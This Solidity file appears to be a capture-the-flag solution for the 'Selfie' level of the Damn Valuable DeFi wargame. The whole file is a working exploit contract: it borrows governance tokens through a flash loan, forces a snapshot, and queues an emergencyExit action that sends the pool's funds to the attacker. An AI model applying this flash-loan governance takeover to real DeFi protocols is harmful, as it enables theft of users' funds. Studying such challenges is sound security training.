// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";


contract SelfieExecutor is IERC3156FlashBorrower {
    using Address for address payable;

    SimpleGovernance governance;
    SelfiePool pool;
    address owner;
    uint256 public drainActionId;

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(address _governance, address _pool) {
        owner = msg.sender;
        governance = SimpleGovernance(_governance);
        pool = SelfiePool(_pool);
    }

    function onFlashLoan(address sender, address tokenAddress, uint256 borrowAmount, uint256 fee, bytes calldata _data_) external override returns (bytes32) {
        require(msg.sender == address(pool), "only pool");

        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            owner
        );

        DamnValuableTokenSnapshot(tokenAddress).snapshot();

        drainActionId = governance.queueAction(address(pool), 0, data);

        ERC20Snapshot(tokenAddress).approve(msg.sender, borrowAmount);

        return CALLBACK_SUCCESS;
    }

    function borrow(address tokenAddress, uint256 borrowAmount) external {
        require(msg.sender == owner, "only owner");
        pool.flashLoan(IERC3156FlashBorrower(address(this)), tokenAddress, borrowAmount, "");
    }

}

